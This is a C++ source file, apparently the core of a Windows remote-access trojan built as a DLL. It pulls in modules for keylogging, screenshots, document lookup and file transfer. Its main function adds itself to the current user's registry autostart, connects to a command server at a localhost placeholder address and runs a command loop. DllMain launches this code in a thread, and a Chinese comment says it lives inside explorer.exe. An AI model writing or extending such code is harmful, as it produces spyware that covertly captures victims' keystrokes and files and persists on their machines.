#include <iostream>
#include <WinSock2.h>
#include <fstream>
#include <cstring>
#include "Protocol.h"
#include "struct.h"
#include "screenShot.h"
#include "documentLookUp.h"
#include "reg.h"
#include "autoStartupDir.h"
#include "fileTrans.h"
#include "keylogger.h"
#include "rapidjson/prettywriter.h"
#include "rapidjson/document.h"
#include "rapidjson/istreamwrapper.h"


int main() {
	Protocol* p = new Protocol("127.0.0.1", 10553);
	int status = Reg_CurrentUser(_pgmptr, (char*)"rc");
	if (!status) {
		cout << "注入当前用户自启动成功";
	}
	if (p->Connect() && p->Ping("HAHAHA"))
		p->run();

}



BOOL APIENTRY DllMain(HINSTANCE hInstance, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	HANDLE hThread;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		// 开启一个新线程来运行main，不然资源管理器会卡死，之后main会作为一个独立的线程存在，在explorer.exe进程被结束之前都会存在
		hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);
		if (hThread) MessageBoxA(NULL, "create thread success", "Success", MB_OK);
		else MessageBoxA(NULL, "create thread fail", "Fail", MB_OK);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}